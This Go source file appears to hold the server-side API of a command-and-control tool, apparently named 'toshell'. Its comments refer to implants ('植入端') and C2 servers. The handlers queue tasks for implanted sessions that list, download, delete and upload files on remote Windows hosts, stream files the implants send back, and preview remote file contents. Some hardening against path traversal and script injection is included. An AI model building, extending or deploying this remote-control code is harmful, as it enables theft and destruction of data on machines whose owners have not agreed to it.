package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/common/preview"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

func (s *Server) listFilesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	path := r.URL.Query().Get("path")
	if path == "" {
		path = "C:\\"
	}

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	taskInfo, err := s.taskMgr.CreateFileList(id, path)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "File list task pushed to session %s: %s", id, path)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      path,
		"message":   "File list task pushed",
	})
}

func (s *Server) downloadFileHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	taskInfo, err := s.taskMgr.CreateFileDownload(id, payload.Path)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "File download task pushed to session %s: %s", id, payload.Path)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      payload.Path,
		"message":   "File download task pushed",
	})
}

func (s *Server) deleteFileHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if payload.Path == "" || strings.ContainsRune(payload.Path, 0) {
		http.Error(w, `{"error":"invalid target path"}`, http.StatusBadRequest)
		return
	}

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	taskInfo, err := s.taskMgr.CreateFileDelete(id, payload.Path)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "File delete task pushed to session %s: %s", id, payload.Path)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      payload.Path,
		"message":   "File delete task pushed",
	})
}

// uploadStatusHandler 返回某次暂存上传已收到的字节数（断点续传用，v1.4.3 #15a-B）。
//
//	GET /api/v1/sessions/{id}/files/upload/{upload_id}
//
// 前端在开始传之前先问一次：已收 N 字节就从 N 接着传，不用从头再来。
// 分片是按 offset 定位写入的（见 uploadFileHandler 的 Seek），因此暂存文件的
// 尺寸就等于"已连续收到的字节数"。
func (s *Server) uploadStatusHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	uploadID := vars["upload_id"]

	if uploadID == "" || strings.ContainsAny(uploadID, `/\:`) {
		http.Error(w, `{"error":"invalid upload_id"}`, http.StatusBadRequest)
		return
	}
	if !s.requireSessionFromPath(w, r) {
		return
	}

	staged := filepath.Join("data", "uploads", id, uploadID)
	received := int64(0)
	if info, err := os.Stat(staged); err == nil && info.Mode().IsRegular() {
		received = info.Size()
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"upload_id": uploadID,
		"received":  received,
		"exists":    received > 0,
	})
}

// uploadFileHandler 支持大文件直传：前端按 1MB 分片 POST。
// 非末尾分片写入服务端暂存目录 data/uploads/<sessionID>/<uploadID>；
// 末尾分片（done=true）校验完整性后创建上传任务，并异步把分片推送给植入端。
func (s *Server) uploadFileHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		UploadID string `json:"upload_id"`
		Filename string `json:"filename"`
		Path     string `json:"path"`
		Size     int64  `json:"size"`
		Offset   int64  `json:"offset"`
		Data     string `json:"data"`
		Done     bool   `json:"done"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if payload.UploadID == "" || strings.ContainsAny(payload.UploadID, `/\:`) {
		http.Error(w, `{"error":"invalid upload_id"}`, http.StatusBadRequest)
		return
	}

	if _, err := s.sessionMgr.Get(id); err != nil {
		http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
		return
	}
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	dir := filepath.Join("data", "uploads", id)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	staged := filepath.Join(dir, payload.UploadID)

	// 非末尾分片：按 offset 写入暂存文件
	if !payload.Done {
		data, err := base64.StdEncoding.DecodeString(payload.Data)
		if err != nil {
			http.Error(w, `{"error":"invalid base64 chunk"}`, http.StatusBadRequest)
			return
		}
		f, err := os.OpenFile(staged, os.O_CREATE|os.O_WRONLY, 0o644)
		if err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		if _, err := f.Seek(payload.Offset, io.SeekStart); err != nil {
			f.Close()
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		if _, err := f.Write(data); err != nil {
			f.Close()
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		f.Close()
		json.NewEncoder(w).Encode(map[string]interface{}{
			"accepted": true,
			"offset":   payload.Offset + int64(len(data)),
		})
		return
	}

	// 末尾分片：先写入该分片数据（兼容单分片/多分片，最后一段必须落盘），再校验完整性
	data, derr := base64.StdEncoding.DecodeString(payload.Data)
	if derr != nil {
		http.Error(w, `{"error":"invalid base64 chunk"}`, http.StatusBadRequest)
		return
	}
	f, oerr := os.OpenFile(staged, os.O_CREATE|os.O_WRONLY, 0o644)
	if oerr != nil {
		http.Error(w, `{"error":"`+oerr.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if _, serr := f.Seek(payload.Offset, io.SeekStart); serr != nil {
		f.Close()
		http.Error(w, `{"error":"`+serr.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if _, werr := f.Write(data); werr != nil {
		f.Close()
		http.Error(w, `{"error":"`+werr.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	f.Close()
	info, err := os.Stat(staged)
	if err != nil {
		http.Error(w, `{"error":"upload staging file missing"}`, http.StatusInternalServerError)
		return
	}
	if payload.Size > 0 && info.Size() != payload.Size {
		http.Error(w, fmt.Sprintf(`{"error":"size mismatch: got %d want %d"}`, info.Size(), payload.Size), http.StatusBadRequest)
		return
	}
	if payload.Path == "" || strings.ContainsRune(payload.Path, 0) {
		http.Error(w, `{"error":"invalid target path"}`, http.StatusBadRequest)
		return
	}

	// 创建上传任务并异步推送分片（不阻塞 HTTP 请求）。
	// 会话热迁移：Data 携带上传元数据（upload_id/filename/size），
	// 重连后监听器据此重推暂存分片（断点续传）；推送失败保留暂存文件。
	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: task.TaskTypeFileUp,
		Path:     payload.Path,
	})
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	uploadMeta, _ := json.Marshal(map[string]interface{}{
		"upload_id": payload.UploadID,
		"filename":  payload.Filename,
		"size":      payload.Size,
	})
	taskInfo.Data = string(uploadMeta) // 热迁移重推时从任务数据恢复暂存定位

	go func() {
		if err := s.listener.PushFileUpload(id, payload.UploadID, payload.Filename, payload.Path, payload.Size, taskInfo.ID); err != nil {
			// 失败：保留暂存文件供重连重推，任务标记失败由监听器重推逻辑接管
			s.taskMgr.Fail(taskInfo.ID, err.Error())
			logging.Error("api", "File upload push failed: %v", err)
			return
		}
		// 推送成功：清理暂存文件，避免残留占用磁盘
		if rmErr := os.Remove(staged); rmErr != nil && !os.IsNotExist(rmErr) {
			logging.Error("api", "Failed to remove upload staging %s: %v", staged, rmErr)
		}
	}()

	logging.Info("api", "File upload staged: %s -> %s (%d bytes, task %d)", payload.UploadID, payload.Path, payload.Size, taskInfo.ID)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      payload.Path,
		"message":   "File upload task queued",
	})
}

// transferFileHandler 从服务端磁盘流式下载植入端直传的大文件。
// GET /api/v1/files/transfer?session_id=..&transfer_id=..
// 安全加固：session_id 必须是会话 ID（16 位 hex）或 UUID，防路径穿越读任意文件。
func (s *Server) transferFileHandler(w http.ResponseWriter, r *http.Request) {
	sessionID := r.URL.Query().Get("session_id")
	transferID := r.URL.Query().Get("transfer_id")
	if sessionID == "" || transferID == "" || strings.ContainsAny(transferID, `/\:`) {
		http.Error(w, `{"error":"invalid params"}`, http.StatusBadRequest)
		return
	}
	// sessionID 强校验：仅允许 hex/UUID 字符（会话 ID 由服务端生成，绝不含路径分隔符）
	if !isValidSessionID(sessionID) {
		http.Error(w, `{"error":"invalid session_id"}`, http.StatusBadRequest)
		return
	}

	dir := filepath.Join("data", "transfers", sessionID)
	// 双重防御：Clean + 前缀断言，确保 join 结果仍位于传输目录内
	cleanDir := filepath.Clean(dir)
	path := filepath.Clean(filepath.Join(dir, transferID))
	if !strings.HasPrefix(path, cleanDir+string(filepath.Separator)) {
		http.Error(w, `{"error":"invalid path"}`, http.StatusBadRequest)
		return
	}
	info, err := os.Stat(path)
	if err != nil {
		// 404 诊断：区分「会话目录缺失 / 主文件缺失」两种场景，
		// 前者多为会话 ID 错位（多 C2 / 植入端版本不匹配），
		// 后者多为直传未落盘（连接中断 / 写入失败）。
		diag := map[string]interface{}{
			"error":       "transfer not found",
			"transfer_id": transferID,
			"session_id":  sessionID,
			"target":      path,
			"has_dir":     false,
			"has_file":    false,
			"has_meta":    false,
			"dir_entries": []string{},
		}
		if dInfo, derr := os.Stat(dir); derr == nil {
			diag["has_dir"] = true
			if dInfo.IsDir() {
				if entries, eerr := os.ReadDir(dir); eerr == nil {
					names := make([]string, 0, len(entries))
					for _, e := range entries {
						names = append(names, e.Name())
					}
					diag["dir_entries"] = names
				}
			}
		}
		if _, merr := os.Stat(path + ".meta"); merr == nil {
			diag["has_meta"] = true
		}
		body, _ := json.Marshal(diag)
		logging.Warn("api", "transfer download 404: %s", body)
		http.Error(w, string(body), http.StatusNotFound)
		return
	}

	// 使用 .meta 中的原始文件名作为下载名
	filename := transferID
	if data, err := os.ReadFile(path + ".meta"); err == nil {
		var m struct {
			Filename string `json:"filename"`
		}
		if json.Unmarshal(data, &m) == nil && m.Filename != "" {
			filename = m.Filename
		}
	}

	f, err := os.Open(path)
	if err != nil {
		http.Error(w, `{"error":"transfer not found"}`, http.StatusNotFound)
		return
	}
	defer f.Close()

	// 安全边界：这是"下载"通道，永远按附件下载，绝不让浏览器按后缀内联渲染。
	// 强制 octet-stream + nosniff + sandbox CSP：即使文件名是 .svg/.html/.xml，
	// 也不可能在本站源下执行脚本（预览走 /files/preview 的纯文本通道）。
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("Content-Security-Policy", "default-src 'none'; sandbox")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	http.ServeContent(w, r, filename, info.ModTime(), f)
}

// ─── 文件预览（后缀白名单 + 服务端二次校验）──────────────────────────────────
//
// 现状：预览以前完全在前端做 —— 前端直接发 file_download 任务、把 base64 输出
// 解成字符串塞进 <pre>，前端自己嗅探二进制。限制可被绕过，且未知后缀只有一句
// "[二进制文件，无法预览]"（静默失败）。
//
// 现在：
//   - 规则清单收敛在 internal/common/preview（可单测），并通过
//     GET /api/v1/files/preview-policy 下发给前端；
//   - POST /api/v1/sessions/{id}/files/preview 在**服务端**判定：
//     黑名单后缀直接 415（不创建任务）；未识别后缀未确认时 409（前端弹窗）；
//     允许后等任务回传，再对内容做二进制/图片签名嗅探与截断，最后才把
//     文本/图片（base64）返回。二进制原样不出服务端。

// previewWaitSeconds 预览等待植入端回传的上限。超时返回 504 并提示改用下载，
// 不阻塞 HTTP 请求无限等待。
const previewWaitSeconds = 25

// previewPolicyHandler GET /api/v1/files/preview-policy
// 前端据此渲染"未识别后缀"弹窗与截断标注，避免前后端两份清单漂移。
func (s *Server) previewPolicyHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(preview.DefaultPolicy())
}

// previewSource 预览内容来源：小文件是任务输出里的 base64，大文件是植入端
// 直传到服务端磁盘的 data/transfers/<sessionID>/<transferID>。
type previewSource struct {
	data       []byte // base64 模式（<= 2MB，植入端 directTransferThreshold 以下）
	stagedPath string // 直传模式
	total      int64
}

// readPrefix 读取前 limit 字节（limit<=0 或超过总长时读全部）。
func (src *previewSource) readPrefix(limit int64) ([]byte, error) {
	if limit <= 0 || limit > src.total {
		limit = src.total
	}
	if src.stagedPath == "" {
		n := int64(len(src.data))
		if limit > n {
			limit = n
		}
		return src.data[:limit], nil
	}
	f, err := os.Open(src.stagedPath)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	buf := make([]byte, limit)
	n, err := io.ReadFull(f, buf)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		return nil, err
	}
	return buf[:n], nil
}

// openPreviewSource 解析任务输出：base64 内容，或 {"transfer_id":...} 直传信封。
// transfer_id 来自植入端（不可信），必须做路径分隔符校验 + 前缀断言。
func (s *Server) openPreviewSource(sessionID, output string) (*previewSource, error) {
	out := strings.TrimSpace(output)
	if strings.HasPrefix(out, "{") {
		var meta struct {
			TransferID string `json:"transfer_id"`
		}
		if json.Unmarshal([]byte(out), &meta) == nil && meta.TransferID != "" {
			if meta.TransferID == "" || strings.ContainsAny(meta.TransferID, `/\:`) {
				return nil, fmt.Errorf("invalid transfer id")
			}
			dir := filepath.Join("data", "transfers", sessionID)
			cleanDir := filepath.Clean(dir)
			p := filepath.Clean(filepath.Join(dir, meta.TransferID))
			if !strings.HasPrefix(p, cleanDir+string(filepath.Separator)) {
				return nil, fmt.Errorf("invalid transfer path")
			}
			st, err := os.Stat(p)
			if err != nil || st.IsDir() {
				return nil, fmt.Errorf("transfer file missing")
			}
			return &previewSource{stagedPath: p, total: st.Size()}, nil
		}
	}
	raw, err := base64.StdEncoding.DecodeString(out)
	if err != nil {
		return nil, fmt.Errorf("decode file content: %w", err)
	}
	return &previewSource{data: raw, total: int64(len(raw))}, nil
}

func writePreviewJSON(w http.ResponseWriter, status int, payload map[string]interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(payload)
}

// writePreviewError 统一错误信封：明确 code + 中文 error/message，绝不回传内容。
func writePreviewError(w http.ResponseWriter, status int, code, msg string, dec preview.Decision) {
	payload := map[string]interface{}{
		"success": false,
		"code":    code,
		"error":   msg,
		"message": msg,
	}
	if dec.Category != "" {
		payload["category"] = dec.Category
		payload["ext"] = dec.Ext
		payload["download_only"] = dec.DownloadOnly
		if dec.RequiresConfirmation {
			payload["requires_confirmation"] = true
		}
		if dec.PreviewBytes > 0 {
			payload["preview_bytes"] = dec.PreviewBytes
		}
	}
	writePreviewJSON(w, status, payload)
}

// previewFileHandler POST /api/v1/sessions/{id}/files/preview
//
// 请求：{"path":"C:\\x\\a.log","size":12345,"force":false}
//   - size 是目录列表里的大小（提示用，不可信）；真实大小以回传内容为准；
//   - force=true 仅对"未识别后缀"生效（操作员在弹窗里选择"仍要预览"）。
//
// 响应：{success, category, ext, size, preview_bytes, truncated, content_b64, mime}
func (s *Server) previewFileHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		Path  string `json:"path"`
		Size  int64  `json:"size"`
		Force bool   `json:"force"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		writePreviewError(w, http.StatusBadRequest, preview.CodeBadPath, "Invalid request body", preview.Decision{})
		return
	}
	if strings.TrimSpace(payload.Path) == "" || strings.ContainsRune(payload.Path, 0) {
		writePreviewError(w, http.StatusBadRequest, preview.CodeBadPath, "invalid target path", preview.Decision{})
		return
	}

	// 会话不存在 → 404、listener 未就绪 → 503（语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	// 第一道：只看后缀与大小提示。黑名单/需要确认的请求**不创建任务**，
	// 这样即使前端限制被绕过，也不会把可执行文件内容拉回服务端。
	dec := preview.Decide(payload.Path, payload.Size, payload.Force)
	switch dec.Code {
	case preview.CodeBlocked:
		writePreviewError(w, http.StatusUnsupportedMediaType, dec.Code, dec.Message, dec)
		return
	case preview.CodeUnknown:
		writePreviewError(w, http.StatusConflict, dec.Code, dec.Message, dec)
		return
	case preview.CodeTooLarge:
		writePreviewError(w, http.StatusRequestEntityTooLarge, dec.Code, dec.Message, dec)
		return
	}

	taskInfo, err := s.taskMgr.CreateFileDownload(id, payload.Path)
	if err != nil {
		writePreviewError(w, http.StatusInternalServerError, preview.CodeFailed, err.Error(), preview.Decision{})
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		writePreviewError(w, http.StatusInternalServerError, preview.CodeFailed, err.Error(), preview.Decision{})
		return
	}

	res := s.awaitTaskSettled(taskInfo, previewWaitSeconds)
	if res.Timeout {
		writePreviewError(w, http.StatusGatewayTimeout, preview.CodeTimeout,
			"预览等待超时（文件可能较大），请改用「下载」在本地查看。", preview.Decision{})
		return
	}
	if res.Gone || res.SessionOffline != "" {
		writePreviewError(w, http.StatusServiceUnavailable, preview.CodeFailed,
			"会话已离线，预览失败，请稍后重试或改用下载。", preview.Decision{})
		return
	}
	if res.Task == nil {
		writePreviewError(w, http.StatusBadGateway, preview.CodeFailed, "预览任务无结果", preview.Decision{})
		return
	}
	if res.Task.Status != task.StatusCompleted {
		msg := strings.TrimSpace(res.Task.Error)
		if msg == "" {
			msg = "预览任务未成功完成"
		}
		writePreviewError(w, http.StatusBadGateway, preview.CodeFailed, msg, preview.Decision{})
		return
	}

	src, err := s.openPreviewSource(id, res.Task.Output)
	if err != nil {
		logging.Warn("api", "preview source for session %s: %v", id, err)
		writePreviewError(w, http.StatusBadGateway, preview.CodeFailed, "无法读取预览内容："+err.Error(), preview.Decision{})
		return
	}

	// 第二道：用**真实大小**重新判定（目录列表里的 size 不可信）。
	final := preview.Decide(payload.Path, src.total, payload.Force)
	if !final.Allowed {
		status := http.StatusUnsupportedMediaType
		if final.Code == preview.CodeTooLarge {
			status = http.StatusRequestEntityTooLarge
		}
		writePreviewError(w, status, final.Code, final.Message, final)
		return
	}

	limit := preview.LimitFor(final)
	if final.Category == preview.CategoryImage {
		limit = src.total // 图片必须完整解码；大小已在 Decide 里限过
	}
	content, err := src.readPrefix(limit)
	if err != nil {
		writePreviewError(w, http.StatusBadGateway, preview.CodeFailed, "读取预览内容失败："+err.Error(), preview.Decision{})
		return
	}

	mime := ""
	switch final.Category {
	case preview.CategoryImage:
		m, ok := preview.SniffImageMIME(content)
		if !ok {
			writePreviewError(w, http.StatusUnsupportedMediaType, preview.CodeBadImage,
				"该文件后缀是图片但内容签名不匹配，已拒绝内联预览（避免伪装内容被当作图片渲染）；请下载查看。", final)
			return
		}
		mime = m
	default:
		// 文本类与"强制预览的未知后缀"：二进制探测命中即拒绝。
		if preview.LooksBinary(content) {
			writePreviewError(w, http.StatusUnsupportedMediaType, preview.CodeBinary,
				"文件内容被判定为二进制（含 NUL/控制字符），已拒绝内联预览；请下载后在本地查看。", final)
			return
		}
	}

	truncated := final.Truncated || src.total > int64(len(content))
	logging.Info("api", "File preview session=%s path=%s category=%s size=%d preview=%d truncated=%v",
		id, payload.Path, final.Category, src.total, len(content), truncated)

	writePreviewJSON(w, http.StatusOK, map[string]interface{}{
		"success":       true,
		"path":          payload.Path,
		"category":      final.Category,
		"ext":           final.Ext,
		"size":          src.total,
		"preview_bytes": len(content),
		"truncated":     truncated,
		"mime":          mime,
		"content_b64":   base64.StdEncoding.EncodeToString(content),
		"message":       final.Message,
	})
}

// isValidSessionID 校验会话 ID 格式：16 位 hex（TCP/WS 会话）或 UUID（预留）。
// 用于路径拼接前的强校验，防路径穿越（session_id 绝不含路径分隔符）。
func isValidSessionID(id string) bool {
	if len(id) == 16 {
		for _, c := range id {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				return false
			}
		}
		return true
	}
	// UUID: 8-4-4-4-12
	if len(id) == 36 {
		for i, c := range id {
			if i == 8 || i == 13 || i == 18 || i == 23 {
				if c != '-' {
					return false
				}
				continue
			}
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				return false
			}
		}
		return true
	}
	return false
}
